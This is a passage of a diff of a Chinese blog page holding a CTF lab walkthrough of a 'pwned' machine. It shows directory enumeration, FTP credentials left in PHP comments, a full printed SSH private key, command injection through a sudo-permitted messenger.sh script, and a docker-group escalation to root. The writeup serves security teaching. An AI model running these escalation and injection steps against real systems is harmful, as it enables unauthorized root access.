404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/nothing              (Status: 301) [Size: 316] [--&gt; http://192.168.31.51/nothing/]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]</span><br><span class="line">/hidden_text          (Status: 301) [Size: 320] [--&gt; http://192.168.31.51/hidden_text/]</span><br><span class="line">Progress: 220559 / 220560 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
-
-<p>/nothing:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i said nothing bro</span><br></pre></td></tr></table></figure>
-
-<p>/hidden_text:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/hacked</span><br><span class="line">/vanakam_nanba</span><br><span class="line">/hackerman.gif </span><br><span class="line">/facebook</span><br><span class="line">/whatsapp</span><br><span class="line">/instagram</span><br><span class="line">/pwned</span><br><span class="line">/pwned.com</span><br><span class="line">/pubg </span><br><span class="line">/cod</span><br><span class="line">/fortnite</span><br><span class="line">/youtube</span><br><span class="line">/kali.org</span><br><span class="line">/hacked.vuln</span><br><span class="line">/users.vuln</span><br><span class="line">/passwd.vuln</span><br><span class="line">/pwned.vuln</span><br><span class="line">/backup.vuln</span><br><span class="line">/.ssh</span><br><span class="line">/root</span><br><span class="line">/home</span><br></pre></td></tr></table></figure>
-
-<p>利用给的目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.51&quot; -w ./secret.dic</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.51</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                ./secret.dic</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/pwned.vuln           (Status: 301) [Size: 319] [--&gt; http://192.168.31.51/pwned.vuln/]</span><br><span class="line">Progress: 22 / 23 (95.65%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
-
-<p>前端给了源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//	if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">//		$un=$_POST[&#x27;username&#x27;];</span><br><span class="line">//		$pw=$_POST[&#x27;password&#x27;];</span><br><span class="line">//</span><br><span class="line">//	if ($un==&#x27;ftpuser&#x27; &amp;&amp; $pw==&#x27;B0ss_B!TcH&#x27;) &#123;</span><br><span class="line">//		echo &quot;welcome&quot;</span><br><span class="line">//		exit();</span><br><span class="line">// &#125;</span><br><span class="line">// else </span><br><span class="line">//	echo &quot;Invalid creds&quot;</span><br><span class="line">// &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这是ftp的账号然后登录ftp</p>
-<h1 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls -la</span><br><span class="line">229 Entering Extended Passive Mode (|||48619|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    3 0        0            4096 Jul 09  2020 .</span><br><span class="line">drwxr-xr-x    5 0        0            4096 Jul 10  2020 ..</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jul 10  2020 share</span><br></pre></td></tr></table></figure>
-
-<p>有一个share文件夹，文件夹有id_rsa和note.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||53927|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa</span><br><span class="line">-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>
-
-<p>get下载下来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get id_rsa</span><br><span class="line">local: id_rsa remote: id_rsa</span><br><span class="line">229 Entering Extended Passive Mode (|||26918|)</span><br><span class="line">150 Opening BINARY mode data connection for id_rsa (2602 bytes).</span><br><span class="line">100% |***************************************************************************|  2602      350.29 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">2602 bytes received in 00:00 (308.45 KiB/s)</span><br><span class="line">ftp&gt; get note.txt</span><br><span class="line">local: note.txt remote: note.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||52418|)</span><br><span class="line">150 Opening BINARY mode data connection for note.txt (75 bytes).</span><br><span class="line">100% |***************************************************************************|    75       34.79 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">75 bytes received in 00:00 (21.66 KiB/s)</span><br></pre></td></tr></table></figure>
-
-<p>文件内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAthncqHSPVcE7xs136G/G7duiV6wULU+1Y906aF3ltGpht/sXByPB</span><br><span class="line">aEzxOfqRXlQfkk7hpSYk8FCAibxddTGkd5YpcSH7U145sc2n7jwv0swjMu1ml+B5Vra7JJ</span><br><span class="line">0cP/I27BcjMy7BxRpugZQJP214jiEixOK6gxTILZRAfHedblnd2rW6PhRcQK++jcEFM+ur</span><br><span class="line">gaaktNdFyK4deT+YHghsYAUi/zyWcvqSOGy9iwO62w4TvMfYRaIL7hzhtvR6Ze6aBypqhV</span><br><span class="line">m1C6YIIddYcJuXCV/DgiWXTIUQnhl38/Hxp0lzkhcN8muzOAmFMehktm3bX+y01jX+LziU</span><br><span class="line">GDYM7cTQitZ0MhPDMwIoR0L89mjP4lVyX4A0kn/MxQaj4IxQnY7QG4D4C1bMIYJ0IA//k9</span><br><span class="line">d4h0SNcEOlgDCZ0yCLZQeN3LSBe2IR4qFmdavyXJfb0Nzn5jhfVUchz9N9S8prP6+y3exZ</span><br><span class="line">ADnomqLN1eMcsmu8z5v7w0q7Iv3vS2XMc/c7deZDAAAFiH5GUFF+RlBRAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALYZ3Kh0j1XBO8bNd+hvxu3bolesFC1PtWPdOmhd5bRqYbf7FwcjwWhM8Tn6kV5U</span><br><span class="line">H5JO4aUmJPBQgIm8XXUxpHeWKXEh+1NeObHNp+48L9LMIzLtZpfgeVa2uySdHD/yNuwXIz</span><br><span class="line">MuwcUaboGUCT9teI4hIsTiuoMUyC2UQHx3nW5Z3dq1uj4UXECvvo3BBTPrq4GmpLTXRciu</span><br><span class="line">HXk/mB4IbGAFIv88lnL6kjhsvYsDutsOE7zH2EWiC+4c4bb0emXumgcqaoVZtQumCCHXWH</span><br><span class="line">Cblwlfw4Ill0yFEJ4Zd/Px8adJc5IXDfJrszgJhTHoZLZt21/stNY1/i84lBg2DO3E0IrW</span><br><span class="line">dDITwzMCKEdC/PZoz+JVcl+ANJJ/zMUGo+CMUJ2O0BuA+AtWzCGCdCAP/5PXeIdEjXBDpY</span><br><span class="line">AwmdMgi2UHjdy0gXtiEeKhZnWr8lyX29Dc5+Y4X1VHIc/TfUvKaz+vst3sWQA56JqizdXj</span><br><span class="line">HLJrvM+b+8NKuyL970tlzHP3O3XmQwAAAAMBAAEAAAGACQ18FLvGrGKw0A9C2MFFyGlUxr</span><br><span class="line">r9Pctqnw5OawXP94oaVYUb/fTfFopMq68zLtdLwoA9Y3Jj/7ZgzXgZxUu0e2VxpfgkgF58</span><br><span class="line">y8QHhyZi0j3nug5nPUGhhpgK8aUF1H/8DvyPeWnnpB7OQ47Sbt7IUXiAO/1xfDa6RNnL4u</span><br><span class="line">QnZWb+SnMiURe+BlE2TeG8mnoqyoU4Ru00wOc2++IXc9bDXHqk5L9kU071mex99701utIW</span><br><span class="line">VRoyPDP0F+BDsE6zDwIvfJZxY2nVAZkdxZ+lit5XCSUuNr6zZWBBu9yAwVBaeuqGeZtiFN</span><br><span class="line">W02Xd7eJt3dnFH+hdy5B9dD+jTmRsMkwjeE4vLLaSToVUVl8qWQy2vD6NdS3bdyTXWQWoU</span><br><span class="line">1da3c1FYajXHvQlra6yUjALVLVK8ex4xNlrG86zFRfsc1h2CjqjRqrkt0zJr+Sl3bGk+v6</span><br><span class="line">1DOp1QYfdD1r1IhFpxRlTt32DFcfzBs+tIfreoNSakDLSFBK/G0gQ7acfH4uM9XbBRAAAA</span><br><span class="line">wQC1LMyX0BKA/X0EWZZWjDtbNoS72sTlruffheQ9AiaT+fmbbAwwh2bMOuT5OOZXEH4bQi</span><br><span class="line">B7H5D6uAwhbVTtBLBrOc5xKOOKTcUabEpXJjif+WSK3T1Sd00hJUnNsesIM+GgdDhjXbfx</span><br><span class="line">WY9c2ADpYcD/1g+J5RRHBFr3qdxMPi0zeDZE9052VnJ+WdYzK/5O3TT+8Bi7xVCAZUuQ1K</span><br><span class="line">EcP3XLUrGVM6Usls4DEMJnd1blXAIcwQkAqGqwAHHuxgBIq64AAADBAN0/SEFZ9dGAn0tA</span><br><span class="line">Qsi44wFrozyYmr5OcOd6JtK9UFVqYCgpzfxwDnC+5il1jXgocsf8iFEgBLIvmmtc7dDZKK</span><br><span class="line">mCup9kY+fhR8wDaTgohGPWC6gO/obPD5DE7Omzrel56DaPwB7kdgxQH4aKy9rnjkgwlMa0</span><br><span class="line">hPAK+PN4NfLCDZbnPbhXRSYD+91b4PFPgfSXR06nVCKQ7KR0/2mtD7UR07n/sg2YsMeCzv</span><br><span class="line">m9kzzd64fbqGKEsRAUQJOCcgmKG2Zq3wAAAMEA0rRybJr61RaHlPJMTdjPanh/guzWhM/C</span><br><span class="line">b0HDZLGU9lSEFMMAI+NPWlv9ydQcth6PJRr/w+0t4IVSKClLRBhbUJnB8kCjMKu56RVMkm</span><br><span class="line">j6dQj+JUdPf4pvoUsfymhT98BhF9gUB2K+B/7srQ5NU2yNOV4e9uDmieH6jFY8hRo7RRCo</span><br><span class="line">N71H6gMon74vcdSYpg3EbqocEeUN4ZOq23Bc5R64TLu2mnOrHvOlcMzUq9ydAAufgHSsbY</span><br><span class="line">GxY4+eGHY4WJUdAAAADHJvb3RAQW5ubHlubgECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat note.txt</span><br><span class="line"></span><br><span class="line">Wow you are here</span><br><span class="line"></span><br><span class="line">ariana won&#x27;t happy about this note</span><br><span class="line"></span><br><span class="line">sorry ariana :(</span><br></pre></td></tr></table></figure>
-
-<p>给了ssh的私钥和用户名,给id_rsa文件600的权限然后登录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ssh ariana@192.168.31.51 -i id_rsa</span><br><span class="line">The authenticity of host &#x27;192.168.31.51 (192.168.31.51)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.31.51&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70</span><br><span class="line">ariana@pwned:~$ ls</span><br><span class="line">ariana-personal.diary  user1.txt</span><br></pre></td></tr></table></figure>
-
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ariana@pwned:/$ sudo -l</span><br><span class="line">Matching Defaults entries for ariana on pwned:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ariana may run the following commands on pwned:</span><br><span class="line">    (selena) NOPASSWD: /home/messenger.sh</span><br></pre></td></tr></table></figure>
-
-<p>可以以selena用户，无密码运行/home/messenger.sh</p>
-<p>messenger.sh的内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ariana@pwned:/home$ cat messenger.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">echo &quot;Welcome to linux.messenger &quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;$users&quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter username to send message : &quot; name</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter message for $name :&quot; msg</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Sending message to $name &quot;</span><br><span class="line"></span><br><span class="line">$msg 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Message sent to $name :) &quot;</span><br><span class="line">                echo &quot;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>直接sudo运行可以提权到selena，然后用python获取伪终端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ariana@pwned:/home$ sudo -u selena /home/messenger.sh</span><br><span class="line">Welcome to linux.messenger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ariana:</span><br><span class="line">selena:</span><br><span class="line">ftpuser:</span><br><span class="line"></span><br><span class="line">Enter username to send message : selena</span><br><span class="line"></span><br><span class="line">Enter message for selena :bash</span><br><span class="line"></span><br><span class="line">Sending message to selena</span><br><span class="line">id</span><br><span class="line">uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">selena@pwned:/home$</span><br></pre></td></tr></table></figure>
-
-<p>selena的主目录下有一个user2.txt</p>
-<p>通过id能看到用户在docker组里</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">selena@pwned:/$ id</span><br><span class="line">uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">selena@pwned:/$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">privesc             latest              09ae39f0f8fc        4 years ago         88.3MB</span><br><span class="line">&lt;none&gt;              &lt;none&gt;              e13ad046d435        4 years ago         88.3MB</span><br><span class="line">alpine              latest              a24bb4013296        4 years ago         5.57MB</span><br><span class="line">debian              wheezy              10fcec6d95c4        5 years ago         88.3MB</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/docker/">docker提权</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">selena@pwned:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class="line">id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)</span><br></pre></td></tr></table></figure>
-
-<p>提权成功</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。Docker 守护进程会允许 root 用户和 docker组用户访问 Docker，给用户提供 Docker 权限；用户在docker组里就可以免sudo运行docker，而容器内默认是root用户，用-v选项将用户外的目录映射到容器内既可以以root用户去修改文件</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1353,7 +1381,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">61</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1402,12 +1430,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">327k</span>
+    <span title="站点总字数">335k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:57</span>
+    <span title="站点阅读时长">5:05</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
